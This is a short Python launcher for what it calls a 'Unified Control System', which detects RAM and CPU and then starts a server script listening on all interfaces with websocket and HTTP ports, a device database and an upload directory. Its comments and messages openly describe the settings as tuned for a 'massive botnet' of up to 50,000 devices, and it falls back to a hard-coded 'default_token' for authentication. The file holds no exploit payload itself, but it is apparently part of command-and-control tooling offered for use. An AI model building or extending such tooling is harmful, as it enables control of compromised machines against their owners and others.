#!/usr/bin/env python3
import os
import sys
import subprocess
import psutil
import time

def detect_optimal_settings():
    """Auto-detect optimal settings based on hardware"""
    # Get system specs
    ram_gb = psutil.virtual_memory().total / (1024**3)
    cpu_cores = psutil.cpu_count()
    
    print(f"🔍 Detected: {ram_gb:.1f}GB RAM, {cpu_cores} CPU cores")
    
    # Calculate optimal settings for massive botnet scale
    if ram_gb < 1:
        max_devices = 50
        max_workers = 20
        memory_limit = 256
    elif ram_gb < 2:
        max_devices = 500
        max_workers = 50
        memory_limit = 512
    elif ram_gb < 4:
        max_devices = 2000
        max_workers = 100
        memory_limit = 1024
    elif ram_gb < 8:
        max_devices = 5000
        max_workers = 150
        memory_limit = 1536
    elif ram_gb < 16:
        max_devices = 10000
        max_workers = 200
        memory_limit = 2048
    else:
        max_devices = 50000  # Support for massive enterprise-scale botnets
        max_workers = 500
        memory_limit = 4096
    
    print(f"⚙️  Optimized for massive botnet: {max_devices} max devices, {max_workers} workers, {memory_limit}MB memory limit")
    return max_devices, max_workers, memory_limit

def start_system():
    print("🚀 Starting Unified Control System...")
    
    # Detect optimal settings
    max_devices, max_workers, memory_limit = detect_optimal_settings()
    
    # Set environment variables for optimization
    os.environ['UC_MAX_DEVICES'] = str(max_devices)
    os.environ['UC_MAX_WORKERS'] = str(max_workers)
    os.environ['UC_MEMORY_LIMIT'] = str(memory_limit)
    
    # Start server
    print("📡 Starting server with optimized settings...")
    server_cmd = [
        'python3', 'unified_agent_with_ui.py',
        '--mode', 'server',
        '--auth', os.environ.get('UC_AUTH_TOKEN', 'default_token'),
        '--host', '0.0.0.0',  # Allow mobile connections
        '--ws-port', os.environ.get('UC_WS_PORT', '8765'),
        '--http-port', os.environ.get('UC_HTTP_PORT', '8766'),
        '--db', os.environ.get('UC_DB_PATH', './unified_control.sqlite'),
        '--upload-dir', os.environ.get('UC_UPLOAD_DIR', './uploads')
    ]
    
    try:
        subprocess.run(server_cmd)
    except KeyboardInterrupt:
        print("\n🛑 System stopped by user")

if __name__ == "__main__":
    start_system()
